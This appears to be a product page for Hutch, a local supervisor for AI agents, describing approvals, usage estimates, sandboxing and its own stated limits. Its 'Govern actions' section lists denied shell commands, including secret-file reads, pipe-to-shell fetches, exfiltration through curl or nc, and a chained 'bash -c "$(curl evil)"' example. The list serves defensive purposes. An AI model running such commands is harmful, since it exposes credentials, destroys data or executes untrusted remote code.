Every safety rule here answers a real incident.

A small set of public user reports informed acceptance checks. Each is one reported experience, not evidence of prevalence; links and reproduction limits are recorded in the local research notes.

Usage controls estimates, not invoices

The bill that arrives after the loop won’t stop

Long contexts and retry loops can increase usage. Hutch applies step and time limits and reserves a local estimate before priced hosted calls. Provider tokenization, prices and invoices can differ; use the provider’s own billing controls for an external ceiling.

OpenClaw #138499 one reported lifecycle failure

The scheduled run that quietly never happened

One OpenClaw report describes a timed-out task remaining marked as running and delaying restart. Hutch keeps cancellation visible until owned execution stops and fences expired ownership before recovery. This is an acceptance scenario from one report, not a prevalence claim.

Open WebUI #30055 mobile approval visibility

The approval hidden behind a phone overlay

This report says a full-screen mobile call overlay hid an approval that had already arrived. Hutch keeps approval status and actions in the responsive app view, with fixture checks at phone width. The report is one user’s experience, not a rate estimate.

Open WebUI #31656 phone focus and keyboard

Phone focus that opens the keyboard unexpectedly

The report describes a phone menu opening a text field and the on-screen keyboard unexpectedly. Hutch’s mobile navigation has focus handling and restoration; fixture checks cover the phone view and pending-approval visibility.

Data ownership separate retention scopes

Local agents with zero defaults and messy memory

Hutch keeps chat history, reference facts, workspaces and action receipts separate. Facts start as proposals for their chat, require human review before recall, and need explicit sharing for other chats. Memory can be disabled while records remain manageable; archiving retains fact and review history. Fresh workspaces are the default; a bot can opt into a private managed folder across its chats. Database snapshots exclude workspace files, and permanent scoped deletion remains unfinished.

Verify.

A configured Hutch run uses the selected model and actual tool responses. Human decisions, run status and saved history come from the local application.

  1. 1

    Choose the route

    Connect a model you control or explicitly configure a hosted provider. Give a bot its task, tools and limits; Hutch does not create sample bots for you.

  2. 2

    Keep control

    When a governed action needs a decision, Hutch stores the exact request and pauses. Resolve it from the conversation, the cross-bot Needs you drawer or the CLI; an unanswered request is denied. Optional browser alerts can bring a generic reminder while the Hutch tab stays open.

  3. 3

    Check the work, not the vibes

    Inspect the actual run status, tool results and ordered event transcript. Small text files written through Hutch’s file tool appear as checked downloads in that run; larger files stay in the workspace. Provider-reported usage stays separate from estimates, and uncertain effects remain open for review.

Your machine does the work.
Pick who does the thinking.

Model and tool choices determine where data moves. Hutch keeps its control state on the host; prompts go to the configured model endpoint, and network tools contact their own destinations.

Inference
Every run uses a configured OpenAI, Anthropic, OpenAI-compatible or local model route. Provider HTTP behavior has fixture coverage, but live provider and model compatibility depends on your endpoint and has not been verified here.
Execution
Runs are supervised by Hutch on Linux. Bubblewrap isolation is available when explicitly enabled and supported by the host; it is a namespace sandbox, not a virtual machine. Older bots keep isolation off until an operator enables it.
State
SQLite history is stored under ~/.local/state/hutch by default. Hutch can snapshot committed database history and restore it into a new directory with execution held for review. Reference facts require human review before recall; sharing across a bot’s chats is explicit. Archiving retains fact and review history in later snapshots. Managed workspaces persist per bot when selected but are outside database snapshots. Credentials, browser profiles and user files need separate backups; permanent scoped deletion remains unfinished.
Scheduling
Schedules are processed by one elected local supervisor. The host must be awake and the service running; sleep and disconnection are visible limits, not cloud execution.
Remote and subscriptions
The responsive dashboard supports experimental, HTTPS-paired device access with session revocation; live network and physical-device checks remain open. Browser handoff is unavailable. ChatGPT sign-in is not implemented. OpenCode Go key connections are experimental and limited by their published workload terms.

Govern actions.
Keep cancellation honest.

Hutch checks shell requests before execution, records actions and approvals, and keeps a run visibly stopping until its owned process has exited.

# hard-denied before execution, always
$ sudo / su / doas / pkexec        privilege escalation
$ rm -rf /  ~  $HOME  ..           wipes & escapes
$ cat ~/.ssh/*  .env  ~/.aws       secret paths
$ curl ... | sh                    pipe to interpreter
$ cmd | curl / nc / ssh            exfiltration channels
$ curl -T  /  --post-data          upload flags on fetchers
$ dd / mkfs / fork bombs / reboot  system destruction
# chained commands are split, judged per segment
$ git status && bash -c "$(curl evil)"
     segment 1: git status            allowed
     segment 2: bash -c "$(...)"       denied
     wrappers & substitutions are read through;
     an allow on the outside can never launder
     what is nested inside.
     verdict: worst wins               blocked
# per-bot risk tier refines only the ask zone
readonly   no writes, no mutation — even by rule
supervised the default: medium-risk actions ask you
trusted    runs without asking…
           …except outward sends, which always ask
# hard-denied classes stay denied in every tier

The honest limits

  • Isolation has a boundary. Linux bubblewrap mode uses namespaces and resource limits; it is not a VM. It must be enabled, and migrated bots remain unsandboxed until an operator changes the setting.
  • Humans still review consequential actions. Prompt injection can produce harmful requests; approvals and denials reduce risk but cannot make an allowed action safe.
  • Usage amounts are estimates. Hutch reserves estimated tokens and priced cost before a hosted call. The provider controls actual tokenization and billing.
  • External coding-agent harnesses are disabled. OpenCode and Pi are not launched because Hutch does not yet broker their permissions inside its sandbox.
  • Remote access is experimental. A one-time code pairs a browser with the HTTPS dashboard, and sessions can be revoked. Keep the host online; browser handoff is unavailable and physical-device checks remain open.

What usually stops people

Do I need an API key, a credit card, or a GPU?

Yes. Every run requires a real configured route: an account and key for a hosted provider, or a local model service you already run. Hutch does not provide free simulated runs. Live provider and local-model checks have not been performed for this release.

What actually leaves my machine?

Hutch stores its control state locally. Local model routes keep configured tools online; Hybrid also permits hosted model routes. Experimental Strict Offline gives the worker no host TCP access and routes model traffic through a private socket to a configured loopback service. That separate model service may still proxy requests or download models; this preview has only tested the boundary with a local fixture, not a live model.

What happens when my laptop sleeps on a schedule?

Nothing runs while the machine is off. With the local supervisor running again, configured schedules detect missed windows and either coalesce them into one catch-up run or record a skip, according to the bot’s policy.

Can I run it on my ChatGPT or Claude subscription?

ChatGPT sign-in and consumer chat-plan OAuth are not implemented. Hutch uses explicitly configured provider connections; OpenCode Go remains experimental under its published workload terms. Hutch does not switch a consumer subscription into a provider route.

What does a runaway bot cost me?

Hutch estimates tokens and priced cost, reserves those estimates before calls, and stops admitting more calls when configured limits would be crossed. The estimate can differ from the provider’s invoice; use that provider’s billing controls for an external spending limit. Uncertain calls remain held until reconciled.

Is it safe to let an agent touch my files?

Bubblewrap isolation is available only on Linux and must be enabled; it is not a virtual machine. Approval policy and transcripts provide operator control but do not guarantee safe decisions. Legacy bots may still have isolation disabled. Read the current support boundaries above before use.
